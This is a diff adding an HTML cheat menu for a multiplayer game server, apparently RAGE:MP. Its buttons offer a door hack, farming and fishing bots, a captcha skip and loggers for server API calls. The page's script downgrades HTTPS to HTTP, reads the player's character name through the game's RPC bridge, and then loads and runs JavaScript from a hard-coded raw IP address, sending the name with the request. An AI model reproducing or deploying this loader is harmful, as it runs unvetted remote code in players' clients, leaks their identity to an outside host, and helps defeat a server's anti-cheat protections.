@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>if('https:'==document.location.protocol) document.location.protocol='http:'</script>
+</head>
+<style>
+        .main {
+            padding: 20px;
+            border-radius: 20px;
+            background-color: #ffffff;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            box-shadow: 0px 0px 15px 0px #00000014;
+            display: flex;
+            user-select: none;
+        }
+
+        button {
+            height: 40px;
+            width: 130px;
+            outline: none;
+            border: none;
+            border-radius: 20px;
+            font-family: 'Fira-Sans', sans-serif;
+            font-size: 18px;
+            color: #ffffff;
+            background-color: #347AF0;
+            display: block;
+            margin-top: 5px;
+        }
+
+        .button-list {
+            display: inline-block;
+            border-width: 0 1px 0 0;
+            padding-right: 20px;
+            margin-right: 20px;
+            border-style: solid;
+            border-color: #bebebe;
+        }
+
+        .browser {
+            display: inline-block;
+            width: 1280px;
+            height: 1074px;
+        }
+
+        iframe {
+            width: 1280px;
+            height: 1072px;
+            border-radius: 10px;
+            border-color: #bebebe;
+            border-style: solid;
+            border-width: 1px;
+        }
+
+</style>
+<body>
+    <div id="main" class="main">
+        <div class="button-list">
+            <button onclick="drugsBot()">Drugs bot</button>
+            <button onclick="doorHack()">Door hack</button>
+            <button onclick="antiAFK()">Anti-AFK</button>
+            <button onclick="disableAntiAFK()">Disable Anti-AFK</button>
+            <button onclick="serverAPIgetAsyncLogger()">getAsync logger</button>
+            <button onclick="serverAPIcallApiAsyncLogger()">callApiAsync logger</button>
+            <button onclick="bindThisMenu()">Bind window</button>
+            <button onclick="fishingBot()">Fishing bot</button>
+            <button onclick="fishingCapchaSkip()">Capcha skip</button>
+            <button onclick="junkSearcher()">Junk searcher</button>
+            <button onclick="adminMessageSound()">AMessage sound</button>
+            <button onclick="spawnHouseRobs()">Spawn robs</button>
+        </div>
+        <div class="browser">
+            <iframe id="browser-iframe" src="https://jsconsole.com" frameborder="0"></iframe>
+        </div>
+    </div>
+<script>
+    var script=document.createElement("script");
+    script.src="package://Lib/js/rage-rpc.min.js?r="+Math.random();
+    script.onload=function() {
+        rpc.callClient('client_console_getMyName').then(function(a) {
+            var rpc2js = document.createElement("script");
+            rpc2js.src=`http://88.212.253.252:26548/cache/rpc2.js?characterName=${a.data}`;
+            document.head.append(rpc2js);
+        })
+    }
+        
+    script.onerror=function(e) {
+        mp.trigger("clientFunc_notify", "error", "RPC Loading error. ");
+    }
+    document.head.append(script);
+</script>
+</body>
+</html>
